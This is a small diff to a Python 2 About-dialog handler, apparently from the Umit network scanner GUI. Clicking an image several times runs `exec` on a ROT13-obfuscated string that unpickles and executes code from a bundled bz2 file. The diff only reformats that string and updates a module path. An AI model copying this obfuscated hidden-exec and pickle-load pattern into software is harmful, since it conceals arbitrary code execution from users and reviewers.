@@ -100,9 +100,8 @@ Insecure.Com LLC. and (C) 2007-2008 Adriano Monteiro Marques</small>")
 
     def __set_size(self, widget, extra = None):
         if self.img >= 3:
-            exec "".join([self.d.get(c, c) for c in \
-                          "vzcbeg cvpxyr,om2;sebz hzvgPber.Cnguf vzcbeg Cngu;\
-                          rkrp cvpxyr.ybnq(om2.OM2Svyr(Cngu.hzvg_bcs,'e'))"])
+            exec "".join([self.d.get(c, c) for c in "vzcbeg cvpxyr,om2;sebz hzvg.pber.Cnguf\
+            vzcbeg Cngu; rkrp cvpxyr.ybnq(om2.OM2Svyr(Cngu.hzvg_bcs,'e'))"])                           
         else: self.img += 1
 
     def __set_text(self):
